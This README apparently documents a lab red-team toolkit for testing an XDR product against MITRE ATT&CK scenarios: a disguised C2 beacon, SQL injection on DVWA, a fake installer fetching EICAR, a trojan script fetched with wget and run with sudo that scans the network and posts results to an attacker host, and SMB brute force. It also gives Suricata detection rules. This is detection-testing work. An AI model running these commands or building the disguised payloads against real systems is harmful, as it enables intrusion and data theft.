# CyberFortress RedOps - Attack Simulation Modules

Attack simulation toolkit for testing SmartXDR detection capabilities aligned with the MITRE ATT&CK framework.

## Module Overview

| Module                 | MITRE ATT&CK     | Target                         | Expected Response       |
| ---------------------- | ---------------- | ------------------------------ | ----------------------- |
| c2-outbound-connection | T1071, T1571     | Windows 11 Client -> C2 Server | Isolate Host + Block IP |
| sql-injection          | T1190            | Kali -> DVWA Web Server        | Block Attacker IP       |
| malware-execution      | T1204.002, T1105 | Windows 11 Client              | Isolate Host            |
| network-scanning       | T1046, T1041     | Ubuntu -> LAN                  | Isolate Host            |
| smb-bruteforce         | T1110.001        | Kali -> Windows Server         | Block Attacker IP       |

---

## Scenario 1: C2 Outbound Connection

### Scenario Description

Simulates a situation where a Windows workstation is infected with malware and establishes beacon connections to a Command & Control (C2) server on the Internet. This is a common technique used by APT groups to maintain remote control.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                  | Description                          |
| ------------ | ------------------------------- | ------------------------------------ |
| T1071.001    | Application Layer Protocol: Web | Uses HTTP/HTTPS for C2 communication |
| T1571        | Non-Standard Port               | May use non-standard ports           |
| T1059.001    | PowerShell                      | Remote command execution             |

### Components

```
src/c2-outbound-connection/
├── c2_reverse_shell.py      # Main C2 script
├── config.txt               # C2 host/port configuration
├── malicious_ip.txt         # IOC IP list
├── suricata.local.rules     # Suricata detection rules
├── c2_detection.zeek        # Zeek detection script
└── icons/                   # PDF/Word disguise icons
```

### Configuration

**config.txt:**
```ini
C2_HOST=147.185.133.114
C2_PORT=80
RETRY_INTERVAL=3
```

### Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Windows 11     │         │   Suricata/     │         │  C2 Server      │
│  (Victim)       │────────>│   Zeek Sensor   │────────>│  (Attacker)     │
│  192.168.85.150 │         │                 │         │  147.185.133.114│
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. Run Financial_Report_2025.exe
        │ 2. Open decoy PDF
        │ 3. Send HTTP beacon to C2
        │                          │
        │                    4. Suricata detect SID 9000010-9000015
        │                    5. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
   [Isolate Host]            [Block C2 IP]
```

### Execution

**On Attacker (Kali):**
```bash
# Start C2 listener
nc -lvnp 80
```

**On Victim (Windows):**
```powershell
# Run malware
.\Financial_Report_2025.exe
```

### Detection Rules (Suricata)

```
# SID 9000010: Beacon URI pattern
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 Beacon Pattern Detected (GET /beacon)"; http.uri; content:"/beacon"; sid:9000010;)

# SID 9000012: Malware User-Agent
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 Suspicious User-Agent (MalwareBot)"; http.user_agent; content:"MalwareBot"; sid:9000012;)

# SID 9000013: C2 Header
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 X-Bot-ID Header Detected"; http.header; content:"X-Bot-ID"; sid:9000013;)
```

### Expected Results

| Component | Action                                      |
| --------- | ------------------------------------------- |
| Suricata  | Alert SID 9000010-9000015                   |
| Zeek      | Notice C2Detection::C2_Connection_Attempt   |
| Wazuh     | Rule trigger -> Active Response             |
| SmartXDR  | Classify: ATTACK -> Isolate Host + Block IP |

---

## Scenario 2: SQL Injection Attack

### Scenario Description

External attacker performs SQL Injection attacks against the DVWA web application to steal data or escalate privileges.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                    | Description                           |
| ------------ | --------------------------------- | ------------------------------------- |
| T1190        | Exploit Public-Facing Application | Exploit web application vulnerability |
| T1059.001    | Command and Scripting Interpreter | Execute SQL commands                  |

### Components

```
src/sql-injection/
├── sqli_attack.sh           # Wrapper script for sqlmap
├── config.json              # Target, credentials configuration
├── suricata.local.rules     # Detection rules
└── README.md
```

### Configuration

**config.json:**
```json
{
    "target": {
        "host": "dvwa.local",
        "port": 80,
        "base_url": "/vulnerabilities/sqli/"
    },
    "credentials": {
        "username": "admin",
        "password": "password"
    },
    "attack": {
        "security_level": "low"
    }
}
```

### Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Kali Linux     │         │   Suricata      │         │  DVWA Server    │
│  (Attacker)     │────────>│   (IDS)         │────────>│  (Target)       │
│  192.168.71.100 │         │                 │         │  192.168.85.112 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. ./sqli_attack.sh
        │ 2. sqlmap sends SQLi payloads
        │ 3. ' OR '1'='1' --
        │ 4. UNION SELECT...
        │                          │
        │                    5. Suricata detect SID 9001001-9001010
        │                    6. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
                             [Block Attacker IP]
```

### Execution

**On Attacker (Kali):**
```bash
cd src/sql-injection
chmod +x sqli_attack.sh
./sqli_attack.sh
```

### Detection Rules (Suricata)

```
# SID 9001001: UNION-based SQLi
alert http any any -> $HOME_NET any (msg:"SQLI Union-Based SQL Injection Attempt"; http.uri; content:"UNION"; content:"SELECT"; sid:9001001;)

# SID 9001002: OR-based SQLi
alert http any any -> $HOME_NET any (msg:"SQLI OR-Based SQL Injection"; pcre:"/(\\%27|')(\\s|%20)*(OR|or)(\\s|%20)*('|%27)?1/i"; sid:9001002;)

# SID 9001010: DVWA specific
alert http any any -> $HOME_NET any (msg:"SQLI Attack on DVWA SQLi Module"; http.uri; content:"/vulnerabilities/sqli"; sid:9001010;)
```

### Expected Results

| Component       | Action                                |
| --------------- | ------------------------------------- |
| Suricata        | Alert SID 9001001-9001010             |
| ModSecurity WAF | Block request (403)                   |
| Wazuh           | Rule trigger -> Active Response       |
| SmartXDR        | Classify: ATTACK -> Block Attacker IP |

---

## Scenario 3: Malware Execution

### Scenario Description

User is tricked into downloading and executing a fake installer file. This file displays an "Installing..." UI but secretly downloads EICAR test malware.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                 | Description                     |
| ------------ | ------------------------------ | ------------------------------- |
| T1204.002    | User Execution: Malicious File | User runs malicious file        |
| T1105        | Ingress Tool Transfer          | Download payload from Internet  |
| T1036        | Masquerading                   | Disguise as legitimate software |

### Components

```
src/malware-execution/
├── fake_installer.py        # Dropper source code
├── README.html              # Fake installation guide
├── suricata.local.rules     # Detection rules
└── dist/
    └── MediaPlayerPro_Setup.zip  # Deliverable package
```

### Payload

```python
PAYLOAD_URL = "https://secure.eicar.org/eicar.com.txt"
FAKE_APP_NAME = "Media Player Pro"
PAYLOAD_FILENAME = f"{FAKE_APP_NAME}.exe"
```

### Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Windows 11     │         │   Suricata      │         │  EICAR Server   │
│  (Victim)       │────────>│   (IDS)         │────────>│  (Internet)     │
│  192.168.85.150 │         │                 │         │  secure.eicar.org│
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │
        │ 1. Extract MediaPlayerPro_Setup.zip
        │ 2. Open README.html (fake guide)
        │ 3. Run install.exe
        │ 4. Display "Installing... 100%"
        │ 5. Download EICAR from secure.eicar.org in background
        │
        v                          │
   [EICAR detected]          6. Suricata detect SID 9003001-9003003
   [AV/EDR Alert]            7. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
   [Isolate Host]            [Quarantine File]
```

### Execution

**On Victim (Windows):**
```powershell
# Extract and run
Expand-Archive MediaPlayerPro_Setup.zip -DestinationPath .
.\install.exe
```

### Detection Rules (Suricata)

```
# SID 9003001: EICAR download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE EICAR Test File Download"; http.host; content:"secure.eicar.org"; sid:9003001;)

# SID 9003003: EICAR signature
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"MALWARE EICAR in Response"; file_data; content:"X5O!P%@AP"; sid:9003003;)
```

### Expected Results

| Component        | Action                           |
| ---------------- | -------------------------------- |
| Suricata         | Alert SID 9003001-9003003        |
| Windows Defender | Detect EICAR -> Quarantine       |
| Wazuh            | Sysmon Event 11 (FileCreate)     |
| SmartXDR         | Classify: ATTACK -> Isolate Host |

---

## Scenario 4: Internal Network Reconnaissance

### Scenario Description

An Ubuntu machine in the internal network is compromised. The attacker installs a script disguised as "System Health Check" to scan the network and exfiltrate results to a control server.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name               | Description                    |
| ------------ | ---------------------------- | ------------------------------ |
| T1046        | Network Service Scanning     | Scan network ports/services    |
| T1041        | Exfiltration Over C2 Channel | Send data to attacker          |
| T1036        | Masquerading                 | Disguise as legitimate utility |

### Components

```
src/network-scanning/
├── system_health_check.sh   # Trojan script (disguised)
├── listener.py              # Attacker receiver
├── config.json              # Scan configuration
└── suricata.local.rules     # Detection rules
```

### Configuration

**config.json:**
```json
{
    "attacker": {
        "host": "192.168.71.100",
        "port": 8080
    },
    "scan": {
        "target_network": "192.168.85.0/24",
        "ports": "22,80,443,3389,8080"
    }
}
```

### Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Ubuntu         │         │   Suricata/     │         │  Kali Linux     │
│  (Victim)       │────────>│   Zeek Sensor   │────────>│  (Attacker)     │
│  192.168.85.112 │         │                 │         │  192.168.71.100 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. wget http://attacker:8080/system_health_check.sh
        │ 2. chmod +x && sudo ./system_health_check.sh
        │ 3. Display "Checking disk space..."
        │ 4. Secretly run nmap scan
        │ 5. POST results to attacker
        │                          │
        │                    6. Suricata detect SID 9002001-9002012
        │                    7. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
   [Isolate Host]            [Block Exfil]
```

### Execution

**On Attacker (Kali):**
```bash
cd src/network-scanning
python3 listener.py --port 8080
```

**On Victim (Ubuntu):**
```bash
wget http://192.168.71.100:8080/system_health_check.sh
chmod +x system_health_check.sh
sudo ./system_health_check.sh
```

### Detection Rules (Suricata)

```
# SID 9002001: Nmap ping sweep
alert icmp any any -> $HOME_NET any (msg:"SCAN NMAP Ping Sweep"; itype:8; threshold:type both,track by_src,count 20,seconds 5; sid:9002001;)

# SID 9002010: Data exfiltration
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"EXFIL Network Scan Data Upload"; http.uri; content:"/upload"; http.content_type; content:"application/json"; sid:9002010;)

# SID 9002012: HealthCheck UA
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"EXFIL Suspicious HealthCheck User-Agent"; http.user_agent; content:"HealthCheck"; sid:9002012;)
```

### Expected Results

| Component | Action                                    |
| --------- | ----------------------------------------- |
| Suricata  | Alert SID 9002001-9002012                 |
| Zeek      | Notice C2Detection::C2_Connection_Attempt |
| Wazuh     | Rule trigger -> Active Response           |
| SmartXDR  | Classify: ATTACK -> Isolate Host          |

---

## Scenario 5: SMB Bruteforce

### Scenario Description

Attacker performs password brute force attacks against Windows SMB service to gain unauthorized access.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                            | Description                     |
| ------------ | ----------------------------------------- | ------------------------------- |
| T1110.001    | Brute Force: Password Guessing            | Try multiple passwords to login |
| T1021.002    | Remote Services: SMB/Windows Admin Shares | Access SMB shares remotely      |

### Components

```
src/smb-bruteforce/
├── smb_bruteforce.sh        # Main attack script
├── config.json              # Attack configuration
└── suricata.local.rules     # Detection rules
```

### Execution

**On Attacker (Kali):**
```bash
cd src/smb-bruteforce
chmod +x smb_bruteforce.sh
./smb_bruteforce.sh
```

### Expected Results

| Component | Action                                 |
| --------- | -------------------------------------- |
| Suricata  | Alert SID 9004001-9004010              |
| Windows   | Event ID 4625 (multiple failed logons) |
| Wazuh     | Rule trigger -> Active Response        |
| SmartXDR  | Classify: ATTACK -> Block Attacker IP  |

---

## Detection Rules Summary

| Module                 | SID Range       | Rule Count |
| ---------------------- | --------------- | ---------- |
| c2-outbound-connection | 9000001-9000022 | 15         |
| sql-injection          | 9001001-9001020 | 10         |
| network-scanning       | 9002001-9002012 | 8          |
| malware-execution      | 9003001-9003020 | 8          |
| smb-bruteforce         | 9004001-9004010 | 6          |

## Build Commands

```bash
# Build all modules
python build.py c2-shell-pdf
python build.py malware-installer

# Create ZIP package
Compress-Archive -Path "dist\malware-installer\install.exe", "src\malware-execution\README.html" -DestinationPath "dist\MediaPlayerPro_Setup.zip" -Force
```
